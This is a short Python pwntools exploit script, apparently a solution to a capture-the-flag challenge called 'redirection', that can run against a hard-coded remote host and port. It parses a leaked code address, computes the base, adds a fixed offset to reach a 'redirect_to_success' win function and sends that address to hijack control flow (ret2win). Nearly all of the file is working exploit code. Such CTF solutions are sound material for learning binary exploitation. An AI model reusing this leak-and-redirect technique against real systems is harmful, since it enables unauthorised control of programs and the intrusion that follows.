#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
#context.log_level = 'DEBUG'

TARGET = './redirection'
HOST = '34.131.133.224'
PORT = 12346

elf = ELF(TARGET, checksec=False)
#libc = ELF('./libc.so.6')
#ld = ELF("./ld-2.27.so")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #

p.recvuntil(b'address: ')

leak = int(p.recvline().strip().decode(), 16) - 0x11a9
print(f"Leaked address : {hex(leak)}")

win = leak + 0x1262 # redirect_to_success()'s offset
print(f"Win address : {hex(win)}")

p.sendline(hex(win))

p.interactive()
p.close()

# NOTE:
# Ret2win (with leaked address)
